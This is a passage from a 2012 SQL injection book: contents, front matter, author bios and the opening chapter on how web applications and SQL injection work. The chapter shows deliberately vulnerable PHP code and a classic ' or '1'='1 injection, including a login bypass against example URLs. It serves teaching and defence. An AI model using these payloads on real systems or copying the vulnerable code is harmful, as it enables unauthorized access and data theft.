exploitation summary solutions fast track chapter 5. blind sql injection exploitation introduction finding and confirming blind sql injection using time -based techniques using response -based techniques using alternative channels automating blind sql injection exploitation summary solutions fast track chapter 6. exploiting the operating system introduction accessing the file system executing operating system commands consolidating access summary solutions fast track references chapter 7. advance d topics introduction evading input filters exploiting second -order sql injection exploiting client -side sql injection using hybrid attacks summary solutions fast track chapter 8. code -level defenses introduction domain driven security using parameterized statements validating input encoding output canonicalization design techniques to avoid the dangers of sql injection summary solutions fast track chapter 9. platform level defenses introduction using runtime protection securing the database additional deployment considerations summary solution s fast track chapter 10. confirming and recovering from sql injection attacks introduction investigating a suspected sql injection attack so, you’re a victim —now what? summary solutions fast track chapter 11. references introduction structured query language (sql) primer sql injection quick reference bypassing input validation filters troubleshooting sql injection attacks sql injection on other platforms resources solutions fast track index copyright acquiring editor: chris katsaropolous development editor: heather scherer project manager: jessica vaughan designer: russell purdy syngress is an imprint of elsevier 225 wyman street, waltham, ma 02451, usa © 2012 elsevier, inc. all rights reserved. no part of this publication may be reproduced or transmitted in any form or by any means, electronic or mechanical, including photocopying, recording, or any information storage and retrieval system, without permission in writing from the publisher. details on how to seek permission, further information about the publisher’s permissions policies and our arrangements with organizations such as the copyright clearance center and the copyright licensing agency, can be found at our website: www.elsevier.com/permissions . this book and the individual contributions contained in it are protected under copyright by the publisher (other than as may be noted herein). notices knowledge and best practice in this field are constantly changing. as new research and experience broaden our understanding, changes in research methods or professional practices, may become necessary. practitioners and researchers must always rely on their own experience and knowledge in evaluating and using any information or methods described herein. in using such information or methods they should be mindful of their own safety and the safety of others, including parties for whom they have a professional responsibility. to the fullest extent of the law, neither the publisher nor the authors, contributors, or editors, assume any liability for a ny injury and/or damage to persons or property as a matter of products liability, negligence or otherwise, or from any use or operation of any methods, products, instructions, or ideas contained in the material herein. library of congress cataloging- in-publication data application submitted british library cataloguing- in-publication data a catalogue record for this book is available from the british library. isbn: 978- 1-59749- 963-7 printed in the united states of america 12 13 14 15 16 10 9 8 7 6 5 4 3 2 1 for information on all syngress publications visit our website at www.syngress.com acknowledgements justin would like to thank the syngress editing team (and especially chris katsaropoulos and heather scherer) for once again being willing to take on a book which (in the publishing industry) has a ridiculous number of authors involved. he’d also like to thank, in his role as chief cat -herder, the author team for all pulling together to get this project completed. dedication justin would like to dedicate this book to his daughter adena for being a continual delight to him. dave would like to express heartf elt thanks to his extremely beautiful wife nicole and daughter isla rose, who continuously support and inspire him in all endeavors. sumit ‘sid’ siddharth would like to thank his beautiful wife supriya and his gorgeous daughter shriya for their support. he would also like to thank his pentest team at 7safe for putting up with him. alberto would like to dedicate this book to all the hackers worldwide who have researched the material and written the tools described in this book. i would also like to dedicate it to franziskaner weissbier brewery, munich, without which my contribution would not have been possible. contributing authors rodrigo marcos alvarez (crest consultant, msc, bsc, cissp, cnna, opst, mcp) is the technical director of secforce, a leading penetration testing consultancy. when not leading the technical team, rodrigo still enjoys getting actively involved in the delivery of security assessments and getting his hands dirty writing tools and working on interesting new hacking techniques. rodrigo is a contributor to the owasp project and a security researcher. he is particularly interested in network protocol analysis via fuzzing testing. among other projects, he has released taof, a protocol agnostic gui fuzzer, and proxyfuzz, a tcp/udp proxy which fuzzes network traffic on the fly. rodrigo has also contributed to the web security field by releasing bsishell, a python interacting blind sql injection shell and developing tcp socket reusing attacking techniques. kevvie fowler (gcfa gold, cissp, mcts, m cdba, mcsd, mcse) leads the telus security intelligence analysis practice where he delivers advanced event analysis and proactive intelligence to protect customers against present and emerging threats. he is also the founder and principal consultant of ringzero, a security research and forensic services company. kevvie’s recent research has focused on database forensics, rootkits and native encryption flaws which he has presented at industry conferences including black hat, sector and owasp appsec asia. kevvie is author of sql server forensic analysis and contributing author to several information security and forensics books. as a recognized sans forensicator and giac advisory board member he helps guide the direction of emerging security and forensic resea rch. kevvie serves as a trusted advisor to public and private sector clients and his thought leadership has been featured within information security magazine, dark reading and kaspersky threatpost. dave hartley is a principal security consultant for mwr i nfosecurity operating as a check and crest certified consultant (application and infrastructure). mwr infosecurity supply services which support their clients in identifying, managing and mitigating their information security risks. dave has performed a wi de range of security assessments and provided a myriad of consultancy services for clients in a number of different sectors, including financial institutions, entertainment, media, telecommunications, and software development companies and government organizations worldwide. dave also sits on the crest assessors’ and nbise advisory panels, where he invigilates examinations and collaboratively develops new crest examination modules. crest is a standards -based organization for penetration test suppliers incor porating a best practice technical certification program for individual consultants. dave has also been actively engaged in creating a us centric examination process in conjunction with nbise. dave has been working in the it industry since 1998 and his experience includes a range of it security and disciplines. dave is a published author and regular contributor to many information security periodicals and is also the author of the bobcat sql injection exploitation tool. alexander kornbrust is the founder of red-database- security, a company specializing in database security. he provides database security audits, security training and consulting to customers worldwide. alexander is also involved with designing and developing the mcafee security scanner for dat abases, the leading tool for database security. alexander has worked with oracle products since 1992 and his specialties are the security of oracle databases and architectures. he has reported more than 1200 security bugs to oracle and holds a masters degree (diplom -informatiker) in computer science from the university of passau. erlend oftedal works as a consultant at bekk consulting as in oslo in norway and has been head of bekk’s security competency group for several years. he spends his days as a securi ty adviser and developer for bekk’s clients, and he also does code reviews and security testing. he has done talks on web application security at both software development and security conferences like javazone and owasp appsec europe, and at user groups a nd universities in norway and abroad. he is a security researcher and is very involved in the owasp norway chapter. he is also a member of the norwegian honeynet project. erlend holds a masters degree in computer science from the norwegian university of science and technology (ntnu). gary o’leary -steele (crest consultant) is the technical director of sec- 1 ltd, based in the uk. he currently provides senior -level penetration testing and security consultancy for a variety of clients, including a number of lar ge online retailers and financial sector organizations. his specialties include web application security assessment, network penetration testing and vulnerability research. gary is also the lead author and trainer for the sec -1 certified network security p rofessional (cnsp) training program that has seen more than 3,000 attendees since its launch. gary is credited by microsoft, rsa, gfi, splunk, ibm and marshal software for the discovery of security flaws within their commercial applications. alberto revell i is a security researcher and the author of sqlninja, an open source toolkit that has become a “weapon of choice” when exploiting sql injection vulnerabilities on web applications based on microsoft sql server. as for his day job, he works for a major commodities trading company, mostly breaking and then fixing anything that happens to tickle his curiosity. during his career he has assisted a multitude of companies including major financial institutions, telecom operators, media and manufacturing companies . he has been invited as a speaker to several security conferences, including eusecwest, source, rsa, confidence, shakacon and athcon. he resides in london, enjoying its awful weather and its crazy nightlife together with his girlfriend. sumit “sid” siddharth works as a head of penetration testing for 7safe limited in the uk. he specializes in application and database security and has more than 6 years of pentesting experience. sid has authored a number of whitepapers and tools. he has bee n a speaker/trainer at many security conferences including black hat, def con, troopers, owasp appsec, sec- t etc. he also runs the popular it security blog: www.notsosecure.com marco slaviero is an associate at sensepost, where he heads up sensepost labs (current headcount: 1.5). he has spoken on a variety of security topics, including sql injection, at industry conferences such as blackhat usa and defcon. marco’s areas of expertise cover application testing with a side interest in networks, providing senior consulting to clients on four continents. marco lives with juliette, his wonderful wife. a few years ago, marco earned a masters degree from the university of pretoria, but that’s all in the past now. he still h ates figs. dafydd stuttard is an independent security consultant, author and software developer specializing in penetration testing of web applications and compiled software. dafydd is author of the best -selling web application hacker’s handbook . under the alias “portswigger”, he created the popular burp suite of web application hacking tools. dafydd has developed and presented training courses at security conferences and other venues around the world. dafydd holds masters and doctorate degrees in philosoph y from the university of oxford. lead author and technical editor justin clarke is a co -founder and director of gotham digital science, an information security consulting firm that works with clients to identify, prevent, and manage security risks. he has over fifteen years experience in testing the security of networks, and software for large financial, retail, and technology clients in the united states, united kingdom and new zealand justin is a contributing author to a number of computer security books, as well as a speaker at many conferences and events on security topics, including black hat, eusecwest, oscon, isaca, rsa, sans, owasp, and the british computer society. he is the author of the open source sqlbrute blind sql injection exploitation tool, a nd is the chapter leader for the london chapter of owasp. justin holds a bachelor’s degree in computer science from the university of canterbury in new zealand, as well as postgraduate diplomas in strategic human resources management and accounting. ultima tely he’s not sure which of those turned out to be handier. introduction to the 2nd edition a lot of time has passed since may 2009 when the first edition of this book finally hit the shelves and here we are some three years later with a second edition. wh en we discussed the idea for the first edition, sql injection had already been around for over a decade and was definitely nothing new, yet even in 2008 (some 10 years after its discovery and when the first edition began to take shape) people still didn’t possess a comprehensive understanding of what sql injection is, how to discover sql injection vulnerabilities and/or to exploit them; let alone how to defend against their exploitation nor how to avoid their presence in the first place. also prevalent was the view that sql injection was only relevant to web applications, and that this wasn’t a risk factor for hybrid attacks or usable as a method of penetrating an organization’s external security controls – a fact amply proven false by some of the hacking incidents that occurred at about the time of the release of the first edition (heartland payment systems for example). now it is 2012 as we are completing the second edition, and still little has changed in the basics of sql injection, however technology has moved on and some new progress has been made in applying sql injection in newer areas such as mobile applications, and client -side vectors via html5. this also gave my co -authors and i an opportunity to address some of the feedback we got from readers of the first edition. in this second edition, as well as comprehensively updating all of the content in the book and covering new technologies and approaches, we have increased the scope of database coverage to include postgresql, as well as microsoft sql ser ver, oracle and mysql as the primary database platforms we cover in all chapters, with code examples in java, .net and php where relevant. the book is broadly split into four sections – understanding sql injection ( chapter 1 ), finding sql injection ( chapters 2 and 3), exploiting sql injection ( chapters 4, 5, 6, and 7), and defending against sql injection ( chapters 8, 9, and 10). each of these sections is intended to appeal to different audiences, from all readers (understanding), to security professionals and penetrations testers (finding and exploiting), to developers and it professionals managing databases (finding and def ending). to round out the book we have chapter 11, the reference chapters, which also contains information on other database platforms not covered in the book in detail, allowing the reader to customize the techniques discussed earlier for other database platforms they may come across. some more detail about what is included in each chapter can be found below: chapter one – understanding what sql injection is, and how it happens chapter two – how to find sql injection fr om a web application front end, including how to detect the possible presence of sql injection, how to confirm sql injection is present, and how to automated finding sql injection. chapter three – how to find sql injection in software by reviewing the code , both manually and via automation. chapter four – how to exploit sql injection, including common techniques, union and conditional statements, enumerating the schema, stealing password hashes and automating exploitation. chapter five – how to exploit blin d sql injection, including using time -based, response -based and alternative channels to return data. chapter six – exploiting the operating system via sql injection, including reading and writing files, and executing operating system commands via sql injec tion. chapter seven – advanced exploitation topics, including input filter evasion, exploiting second -order sql injection, exploiting client- side sql injection, and executing hybrid attacks via sql injection. chapter eight – defending your code against sql injection, including design -based approaches, use of parameterization, encoding, and validation approaches to avoid sql injection. chapter nine – defending your application platform against sql injection, including use of runtime protections, hardening the database and secure deployment considerations to mitigate the impact of sql injection. chapter ten – confirming and recovering from sql injection attacks, including how to determine if you’ve fallen prey to sql injection, confirming whether the sql injec tion was successful, and how to recover if you’ve been hacked by sql injection. chapter eleven – references chapter, including a primer on sql, a sql injection quick reference on microsoft sql server, oracle, mysql, and postgresql, as well as details of sql injection on other platforms such as db2, sybase, access and others. chapter 1 what is sql injection? dave hartley solutions in this chapter: • understanding how web applications work • understanding sql injection • understanding how it happens introduction people say they know what sql injection is, but all they have heard about or experienced are trivial examples. sql injection is one of the most devastating vulnerabilities that impact a business, as it can lead to exposure of all of the sensit ive information stored in an application’s database, including handy information such as usernames, passwords, names, addresses, phone numbers, and credit card details. so, what exactly is sql injection? it is the vulnerability that results when you give a n attacker the ability to influence the structured query language (sql) queries that an application passes to a back -end database. by being able to influence what is passed to the database, the attacker can leverage the syntax and capabilities of sql itsel f, as well as the power and flexibility of supporting database functionality and operating system functionality available to the database. sql injection is not a vulnerability that exclusively affects web applications; any code that accepts input from an untrusted source and then uses that input to form dynamic sql statements could be vulnerable (e.g. “fat client” applications in a client/server architecture). in the past, sql injection was more typically leveraged against server side databases, however wit h the current html5 specification, an attacker could equally execute javascript or other codes in order to interact with a client -side database to steal data. similarly with mobile applications (such as on the android platform) malicious applications and/or client side script can be leveraged in similar ways (see labs.mwrinfosecurity.com/notices/webcontentresolver/ for more info). sql injection has probably existed since sql databases were first connected to web applications. however, rain forest puppy is w idely credited with its discovery —or at least for bringing it to the public’s attention. on christmas day 1998, rain forest puppy wrote an article titled “nt web technology vulnerabilities” for phrack (www.phrack.com/issues.html?issue=54&id=8#article ), an e -zine written by and for hackers. rain forest puppy also released an advisory on sql injection (“how i hacked packetstorm,” located at www.wiretrip.net/rfp/txt/rfp2k01.txt ) in early 2000 that detailed how sql injection was used to compromise a popular web site. since then, many researchers have developed and refined techniques for exploiting sql injection. however, to thi s day many developers and security professionals still do not understand it well. in this chapter, we will look at the causes of sql injection. we will start with an overview of how web applications are commonly structured to provide some context for under standing how sql injection occurs. we will then look at what causes sql injection in an application at the code level, and what development practices and behaviors lead us to this. understanding how web applications work most of us use web applications on a daily basis, either as part of our vocation or in order to access our e- mail, book a holiday, purchase a product from an online store, view a news item of interest, and so forth. web applications come in all shapes and sizes. one thing that web applicati ons have in common, regardless of the language in which they were written, is that they are interactive and, more often than not, are database -driven. database -driven web applications are very common in today’s web- enabled society. they normally consist of a back -end database with web pages that contain server -side script written in a programming language that is capable of extracting specific information from a database depending on various dynamic interactions with the user. one of the most common applications for a database- driven web application is an e -commerce application, where a variety of information is stored in a database, such as product information, stock levels, prices, postage and packing costs, and so on. you are probably most familiar with t his type of application when purchasing goods and products online from your e -retailer of choice. a database -driven web application commonly has three tiers: a presentation tier (a web browser or rendering engine), a logic tier (a programming language, such as c#, asp, .net, php, jsp, etc.), and a storage tier (a database such as microsoft sql server, mysql, oracle, etc.). the web browser (the presentation tier, such as internet explorer, safari, firefox, etc.) sends requests to the middle tier (the logic tier), which services the requests by making queries and updates against the database (the storage tier). take, for example, an online retail store that presents a search form that allows you to sift and sort through products that are of particular interest , and provides an option to further refine the products that are displayed to suit financial budget constraints. to view all products within the store that cost less than $100, you could use the following url: • http://www.victim.com/products.php?val=100 the following php script illustrates how the user input ( val) is passed to a dynamically created sql statement. the following section of the php code is executed when the url is requested: // connect to the database $conn = mysql_connect(“localhost”,“username”,“password”); // dynamically build the sql statement with the input $query = “select ∗ from products where price < ‘$_get[“val”]’ ”. “order by productdescription”; // execute the query against the database $result = mysql_query($query); // iterate through the record set while($row = mysql_fetch_array($result, mysql_assoc)) { // display the results to the browser echo “description : {$row[‘productdescription’]} <br>”. “product id : {$row[‘productid’]} <br>”. “price : {$row[‘price’]} <br><br>”; } the following code sample more clearly illustrates the sql statement that the php script builds and executes. the statement will return all of the products in the databas e that cost less than $100. these products will then be displayed and presented to your web browser so that you can continue shopping within your budget constraints. in principle, all interactive database -driven web applications operate in the same way, or at least in a similar fashion: select ∗ from products where price <‘100.00’ order by productdescription; a simple application architecture as noted earlier, a database- driven web application commonly has three tiers: presentation, logic, and storage. to help you better understand how web application technologies interact to present you with a feature -rich web experience, figure 1.1 illustrates the simple three -tier example that i outlined previously. figure 1.1 simple three- tier architecture the presentation tier is the topmost level of the application. it displays information related to such services such as browsing merchandise, purchasing, and shopping cart contents, and it communicates with other tiers by outputting results to the browser/ client tier and all other tiers in the network. the logic tier is pulled out from the presentation tier, and as its own layer, it controls an application’s functionality by performing detailed processing. the data tier consists of database servers. here, i nformation is stored and retrieved. this tier keeps data independent from application servers or business logic. giving data their own tier also improves scalability and performance. in figure 1.1, the web browser (pr esentation) sends requests to the middle tier (logic), which services them by making queries and updates against the database (storage). a fundamental rule in a three -tier architecture is that the presentation tier never communicates directly with the data tier; in a three -tier model, all communication must pass through the middleware tier. conceptually, the three -tier architecture is linear. in figure 1.1, the user fires up his web browser and connects to http://www.victim.com. the web server that resides in the logic tier loads the script from the file system and passes it through its scripting engine, where it is parsed and executed. the script opens a connection to the storage t ier using a database connector and executes an sql statement against the database. the database returns the data to the database connector, which is passed to the scripting engine within the logic tier. the logic tier then implements any application or business logic rules before returning a web page in html format to the user’s web browser within the presentation tier. the user’s web browser renders the html and presents the user with a graphical representation of the code. all of this happens in a matter of seconds and is transparent to the user. a more complex architecture three- tier solutions are not scalable, so in recent years the three- tier model was reevaluated and a new concept built on scalability and maintainability was created: the n- tier applica tion development paradigm. within this a four -tier solution was devised that involves the use of a piece of middleware, typically called an application server , between the web server and the database. an application server in an n- tier architecture is a server that hosts an application programming interface (api) to expose business logic and business processes for use by applications. additional web servers can be introduced as requirements necessitate. in addition, the application server can talk to several sources of data, including databases, mainframes, or other legacy systems. figure 1.2 depicts a simple, four -tier architecture. figure 1.2 four -tier architecture in figure 1.2, the web browser (presentation) sends requests to the middle tier (logic), which in turn calls the exposed apis of the application server residing within the application tier, which services them by making queries and updates against the database (storage ). in figure 1.2, the user fires up his web browser and connects to http://www.victim.com. the web server that resides in the logic tier loads the script from the file system and passes it through its scripting engine where it is parsed and executed. the script calls an exposed api from the application server that resides in the application tier. the application server opens a connection to the storage tier using a database connector and executes an sql statement against the database. the database returns the data to the database connector and the application server then implements any applicat ion or business logic rules before returning the data to the web server. the web server then implements any final logic before presenting the data in html format to the user’s web browser within the presentation tier. the user’s web browser renders the htm l and presents the user with a graphical representation of the code. all of this happens in a matter of seconds and is transparent to the user. the basic concept of a tiered architecture involves breaking an application into logical chunks, or tiers, each of which is assigned general or specific roles. tiers can be located on different machines or on the same machine where they virtually or conceptually separate from one another. the more tiers you use, the more specific each tier’s role is. separating the responsibilities of an application into multiple tiers makes it easier to scale the application, allows for better separation of development tasks among developers, and makes an application more readable and its components more reusable. the approach can a lso make applications more robust by eliminating a single point of failure. for example, a decision to change database vendors should require nothing more than some changes to the applicable portions of the application tier; the presentation and logic tier s remain unchanged. three -tier and four-tier architectures are the most commonly deployed architectures on the internet today; however, the n-tier model is extremely flexible and, as previously discussed, the concept allows for many tiers and layers to be logically separated and deployed in a myriad of ways. understanding sql injection web applications are becoming more sophisticated and increasingly technically complex. they range from dynamic internet and intranet portals, such as e- commerce sites and par tner extranets, to http -delivered enterprise applications such as document management systems and erp applications. the availability of these systems and the sensitivity of the data that they store and process are becoming critical to almost all major businesses, not just those that have online e -commerce stores. web applications and their supporting infrastructure and environments use diverse technologies and can contain a significant amount of modified and customized codes. the very nature of their featur e-rich design and their capability to collate, process, and disseminate information over the internet or from within an intranet makes them a popular target for attack. also, since the network security technology market has matured and there are fewer oppo rtunities to breach information systems through network -based vulnerabilities, hackers are increasingly switching their focus to attempting to compromise applications. sql injection is an attack in which the sql code is inserted or appended into applicatio n/user input parameters that are later passed to a back -end sql server for parsing and execution. any procedure that constructs sql statements could potentially be vulnerable, as the diverse nature of sql and the methods available for constructing it provi de a wealth of coding options. the primary form of sql injection consists of direct insertion of code into parameters that are concatenated with sql commands and executed. a less direct attack injects malicious code into strings that are destined for stora ge in a table or as metadata. when the stored strings are subsequently concatenated into a dynamic sql command, the malicious code is executed. when a web application fails to properly sanitize the parameters which are passed to dynamically created sql statements (even when using parameterization techniques) it is possible for an attacker to alter the construction of back- end sql statements. when an attacker is able to modify an sql statement, the statement will execute with the same rights as the applicati on user; when using the sql server to execute commands that interact with the operating system, the process will run with the same permissions as the component that executed the command (e.g. database server, application server, or web server), which is of ten highly privileged. to illustrate this, let’s return to the previous example of a simple online retail store. if you remember, we attempted to view all products within the store that cost less than $100, by using the following url: • http://www.victim.com/products.php?val=100 the url examples in this chapter use get parameters instead of post parameters for ease of illustration. post parameters are just as easy to manipulate; however, this usuall y involves the use of something else, such as a traffic manipulation tool, web browser plug -in, or inline proxy application. this time, however, you are going to attempt to inject your own sql commands by appending them to the input parameter val . you can do this by appending the string ‘or ‘1’= ‘1 to the url: • http://www.victim.com/products.php?val=100’ or ‘1’=‘1 this time, the sql statement that the php script builds and executes will return all of the products in the database regardless of their price. this is because you have altered the logic of the query. this happens because the appended statement results in the or operand of the query always returning true , that is, 1 will always be equal to 1. here is the query that was built and executed: select ∗ from productstbl where price < ‘100.00’ or ‘1’ = ‘1’ order by productdescription; there are many ways to exploit sql injection vulnerabilities to achieve a myriad of goals; the success of the atta ck is usually highly dependent on the underlying database and interconnected systems that are under attack. sometimes it can take a great deal of skill and perseverance to exploit a vulnerability to its full potential. the preceding simple example demonstr ates how an attacker can manipulate a dynamically created sql statement that is formed from input that has not been validated or encoded to perform actions that the developer of an application did not foresee or intend. the example, however, perhaps does n ot illustrate the effectiveness of such a vulnerability; after all, we only used the vector to view all of the products in the database, and we could have legitimately done that by using the application’s functionality as it was intended to be used in the first place. what if the same application can be remotely administered using a content management system (cms)? a cms is a web application that is used to create, edit, manage, and publish content to a web site, without having to have an in- depth understanding of or ability to code in html. you can use the following url to access the cms application: • http://www.victim.com/cms/login.php?username=foo&password=bar the cms applicati on requires that you supply a valid username and password before you can access its functionality. accessing the preceding url would result in the error “incorrect username or password, please try again.” here is the code for the login.php script: // connect to the database $conn = mysql_connect(“localhost”,“username”,“password”); // dynamically build the sql statement with the input $query = “select userid from cmsusers where user = ‘$_get[“user”]’ ”. “and password = ‘$_get[“password”]’”; // execute the query against the database $result = mysql_query($query); // check to see how many rows were returned from the database $rowcount = mysql_num_rows($result); // if a row is returned then the credentials must be valid, so // forward the user to the admin pages if ($rowcount ! = 0){header(“location: admin.php”);} // if a row is not returned then the credentials must be invalid else {die(‘incorrect username or password, please try again.’)} the login.php script dynamically creates an sql statemen t that will return a record set if a username and matching password are entered. the sql statement that the php script builds and executes is illustrated more clearly in the following code snippet. the query will return the userid that corresponds to the user if the user and password values entered match a corresponding stored value in the cmsusers table: select userid from cmsusers where user = ‘foo’ and password = ‘bar’; the problem with the code is that the application developer believes the number of records returned when the script is executed will always be zero or one. in the previous injection example, we used the exploitable vector to change the meaning of the sql q uery to always return true. if we use the same technique with the cms application, we can cause the application logic to fail. by appending the string ‘or ‘1’=’1 to the following url, the sql statement that the php script builds and executes this time will return all of the userid s for all of the users in the cmsusers table. the url would look like this: • http://www.victim.com/cms/login.php?username=foo&password=bar ’ or ‘1’=’1 all of the userid s are returned because we altered the logic of the query. this happens because the appended statement results in the or operand of the query always returning true , that is, 1 will always be equal to 1. here is the query that was built and ex ecuted: select userid from cmsusers where user = ‘foo’ and password = ‘password’ or ‘1’ = ‘1’; the logic of the application means that if the database returns more than zero records, we must have entered the correct authentication credentials and should be redirected and given access to the protected admin.php script. we will normally be logged in as the first user in the cmsusers table. an sql injection vulnerability has allowed the application logic to be manipulated and subverted. do not try any of these examples on any web applications or systems, unless you have permission (in writing, preferably) from the application or system owner. in the united states, you could be prosecuted under the computer fraud and abuse act of 1986 (www.cio.energy.gov/documents/computerfraud -abuseact.pdf ) or the usa patriot act of 2001. in the united kingdom, you could be prosecuted under the computer misuse act of 1990 ( www.opsi.gov.uk/acts/acts1990/ukpga_19900018_en_1) and the revised police and justice act of 2006 ( www.opsi.gov.uk/acts/acts2006/ukpga_20060048_en_1). if successfully charged and prosecuted, you could receive a fine or a lengthy prison sentence. high -profile examples it is difficult to correctly and accurately gather data on exactly how many organizations are vulnerable to or have been compr omised via an sql injection vulnerability, as companies in many countries, unlike their us counterparts, are not obliged by law to publicly disclose when they have experienced a serious breach of security. however, security breaches and successful attacks executed by malicious attackers are now a favorite media topic for the world press. the smallest of breaches, that historically may have gone unnoticed by the wider public, are often heavily publicized today. some publicly available resources can help you understand how large an issue sql injection is. for instance, the 2011 cwe (common weakness enumeration)/sans top 25 most dangerous software errors is a list of the most widespread and critical errors that can lead to serious vulnerabilities in the softwar e. the top 25 entries are prioritized using inputs from over 20 different organizations, which evaluated each weakness based on prevalence, importance, and likelihood of exploit. it uses the common weakness scoring system (cwss) to score and rank the final results. the 2011 cwe/sans top 25 most dangerous software errors list, places sql injection at the very top ( http://cwe.mitre.org/top25/index.html ). in addition, the open web application security proje ct (owasp) lists injection flaws (which include sql injection) as the most serious security vulnerability affecting web applications in its 2010 top 10 list. the primary aim of the owasp top 10 is to educate developers, designers, architects, and organizat ions about the consequences of the most common web application security vulnerabilities. in the previous list published in 2007, sql injection was listed at second place. owasp, for 2010, changed the ranking methodology to estimate risk, instead of relying solely on the frequency of the associated weakness. the owasp top 10 list has historically been compiled from data extracted from common vulnerabilities and exposures (cve) list of publicly known information security vulnerabilities and exposures publishe d by the mitre corporation ( http://cve.mitre.org/). the problem with using cve numbers as an indication of how many sites are vulnerable to sql injection is that the data does not provide insight into vulnerabilities w ithin custom -built sites. cve requests represent the volume of discovered vulnerabilities in commercial and open source applications; they do not reflect the degree to which those vulnerabilities exist in the real world. in reality, the situation is much, much worse. nonetheless, the trends report published in 2007 can make interesting reading ( http://cve.mitre.org/docs/vuln -trends/vulntrends.pdf ). we can also look to other resources that collate information on compromised web sites. zone -h, for instance, is a popular web site that records web site defacements. the site shows that a large number of high- profile web sites and web applications have been hacked over the years due to the presence of exploitable sql injection vulnerabilities. web sites within the microsoft domain have been defaced some 46 times or more going back as far as 2001. you can view a comprehensive list of hacked microsoft sites o nline at zone -h (www.zone h.org/content/view/14980/1/ ). the traditional press also likes to heavily publicize any security data breaches, especially those that affect well -known and high -profile c ompanies. here is a list of some of these: • in february 2002, jeremiah jacks ( www.securityfocus.com/news/346) discovered that guess.com was vulnerable to sql injection. he gained access to at least 200 ,000 customers’ credit card details. • in june 2003, jeremiah jacks struck again, this time at petco.com (www.securityfocus.com/news/6194), where he gained access to 500,000 credit card details via an sql injection flaw. • on june 17, 2005, mastercard alerted some of its customers to a breach in the security of card systems solutions. at the time, it was the largest known breach of its kind. by exploiting an sql injection flaw ( www.ftc.gov/os/caselist/0523148/0523148complaint.pdf ), a hacker gained access to 40 million credit card details. • in december 2005, guidance software, developer of encase, discovered that a hacker had compromised its database server via an sql injection flaw (www.ftc.gov/os/caselist/0623057/0623057complaint.pdf ), expos ing the financial records of 3800 customers. • circa december 2006, the us discount retailer tjx was successfully hacked and the attackers stole millions of payment card details from the tjx databases. • in august 2007, the united nations web site ( www.un.org ) was defaced via sql injection vulnerability by an attacker in order to display anti -us messages (http://news.cnet.com/8301- 10784_3- 9758843- 7.html ). • in 2008, the asprox botnet leverages sql injection flaws for mass drive by malware infections in order to grow its botnet ( http://en.wikipedia.org/wiki/asprox ). the number of exploited web pages is estimate d at 500,000. • in february 2009, a group of romanian hackers in separate incidents allegedly broke into kaspersky, f -secure, and bit -defender web sites by use of sql injection attacks. the romanians went on to allegedly hack many other high profile web si tes such as rbs worldpay, cnet.com, bt.com, tiscali.co.uk, and national -lottery.co.uk. • on august 17, 2009, the us justice department charged an american citizen albert gonzalez and two unnamed russians with the theft of 130 million credit card numbers us ing a sql injection attack. among the companies compromised were credit card processor heartland payment systems, convenience store chain 7 -eleven, and supermarket chain hannaford brothers. • in february 2011, hbgaryfederal.com was found by the anonymous g roup to be vulnerable to a sql injection flaw within its cms. • in april 2011, barracuda networks web site (barracudanetworks.com) was found to be vulnerable to sql injection and the hacker responsible for the compromise published database dumps online —inc luding the authentication credentials and hashed passwords for cms users! • in may 2011, lulzsec compromised several sony web sites (sonypictures.com, sonymusic.gr, and sonymusic.co.jp) and proceeded to dump the database contents online for their amusement . lulzsec says it accessed the passwords, e- mail addresses, home addresses and dates of birth of one million users. the group says it also stole all admin details of sony pictures, including passwords. 75,000 music codes and 3.5 million music coupons were also accessed, according to the press release. • in may 2011, lulzsec compromised the public broadcast service (pbs) web site —in addition to dumping numerous sql databases through a sql injection attack, lulzsec injected a new page into pbs’s web site. lul zsec posted usernames and hashed passwords for the database administrators and users. the group also posted the logins of all pbs local affiliates, including their plain text passwords. • in june 2011, lady gaga’s fan site was hacked and according to a sta tement released at the time “the hackers took a content database dump from www.ladygaga.co.uk and a section of e-mail, first name, and last name records were accessed. there were no passwords or financial information taken” —http://www.mirror.co.uk/celebs/news/2011/07/16/lady -gaga website -hacked -and-fans-details -stolen -115875- 23274356. histo rically, attackers would compromise a web site or web application to score points with other hacker groups, to spread their particular political viewpoints and messages, to show off their “mad skillz,” or simply to retaliate against a perceived slur or injustice. today, however, an attacker is much more likely to exploit a web application to gain financially and make a profit. a wide range of potential groups of attackers are on the internet today, all with differing motivations (i’m sure everyone reading t his book is more than aware of who lulzsec and anonymous are!). they range from individuals looking simply to compromise systems driven by a passion for technology and a “hacker” mentality, focused criminal organizations seeking potential targets for financial proliferation, and political activists motivated by personal or group beliefs, to disgruntled employees and system administrators abusing their privileges and opportunities for a variety of goals. a sql injection vulnerability in a web site or web application is often all an attacker needs to accomplish his goal. starting in early 2008, hundreds of thousands of web sites were compromised by means of an automated sql injection attack (asprox). a tool was used to search for potentially vulnerable applica tions on the internet, and when a vulnerable site was found the tool automatically exploited them. when the exploit payload was delivered it executed an iterative sql loop that located every user -created table in the remote database and then appended every text column within the table with a malicious client- side script. as most database -driven web applications use data in the database to dynamically construct web content, eventually the script would be presented to a user of the compromised web site or application. the tag would instruct any browser that loads an infected web page to execute a malicious script that was hosted on a remote server. the purpose of this was to infect as many hosts with malware as possible. it was a very effective attack. signifi cant sites such as ones operated by government agencies, the united nations, and major corporations were compromised and infected by this mass attack. it is difficult to ascertain exactly how many client computers and visitors to these sites were in turn infected or compromised, especially as the payload that was delivered was customizable by the individual launching the attack. are you owned? it couldn’t happen to me, could it? i have assessed many web applications over the years, and i used to find that o ne in every three applications i tested was vulnerable to sql injection. to some extent this is still true, however i do feel that i have to work that much harder for my rewards these days. this could be down to a number of variables that are far too diffi cult to quantify, however i genuinely believe that with the improvement in the general security of common development frameworks and developer education stratagems, developers are making a concentrated effort to avoid introducing these flaws into their app lications. presently i am seeing sql injection flaws in technologies and/or applications produced by inexperienced developers coding for emerging technologies and/or platforms but then again the asprox botnet is still going strong! the impact of the vulner ability varies among applications and platforms, but this vulnerability is present in many applications today. many applications are exposed to hostile environments such as the internet without being assessed for vulnerabilities. defacing a web site is a v ery noisy and noticeable action and is usually performed by “script kiddies” to score points and respect among other hacker groups. more serious and motivated attackers do not want to draw attention to their actions. it is perfectly feasible that sophistic ated and skilled attackers would use an sql injection vulnerability to gain access to and compromise interconnected systems. i have, on more than one occasion, had to inform a client that their systems have been compromised and are actively being used by h ackers for a number of illegal activities. some organizations and web site owners may never know whether their systems have been previously exploited or whether hackers currently have a back door into their systems. understanding how it happens sql is the standard language for accessing microsoft sql server, oracle, mysql, sybase, and informix (as well as other) database servers. most web applications need to interact with a database, and most web application programming languages, such as asp, c#, .net, ja va, and php, provide programmatic ways of connecting to a database and interacting with it. sql injection vulnerabilities most commonly occur when the 